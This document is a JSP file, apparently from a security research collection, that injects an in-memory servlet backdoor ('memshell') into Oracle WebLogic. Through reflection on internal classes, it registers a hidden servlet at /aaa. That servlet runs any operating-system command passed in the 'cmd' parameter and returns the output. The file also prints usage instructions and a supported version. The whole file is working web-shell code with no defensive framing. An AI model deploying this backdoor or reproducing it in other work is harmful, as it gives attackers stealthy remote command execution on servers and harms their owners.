<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="weblogic.servlet.utils.ServletMapping" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="weblogic.servlet.internal.ServletStubImpl" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %><%--
  Created by IntelliJ IDEA.
  User: Jack
  Date: 2023/7/2
  Time: 0:56
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%

    // 创建servlet
    HttpServlet httpServlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
                String a;
                PrintWriter out = resp.getWriter();
                while ((a = bufferedReader.readLine()) != null) {
                    out.write(a);
                }
                out.flush();
                out.close();
                process.destroy();
            }


            return;
        }
    };

    String URI = "/aaa";
// 获取servletContext
    weblogic.servlet.internal.WebAppServletContext servletContext = (WebAppServletContext) request.getServletContext();

    try {
        // 获取servletMapping
        Method getServletMapping = servletContext.getClass().getDeclaredMethod("getServletMapping");
        getServletMapping.setAccessible(true);
        ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext);

        // 使用ServletStub包装HttpServlet
        Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
        ServletStubImplConstructor.setAccessible(true);
        ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext);

        // 使用URLMathchHelper包装ServletStub
        Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
        URLMatchHelperConstructor.setAccessible(true);
        Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);

        // 添加到ServletMapping中，即代表注入servlet内存马成功
        if (mappings.get(URI) == null){
            mappings.put(URI, umh);
        }

        response.getWriter().write("\n this page inject the Servlet type memshell, it can be accessed with /weblogic_pro/aaa?cmd=cmd /c dir. It works on 12.2.3.0 version.");

    } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException | ClassNotFoundException | InstantiationException e) {
        e.printStackTrace();
    }
%>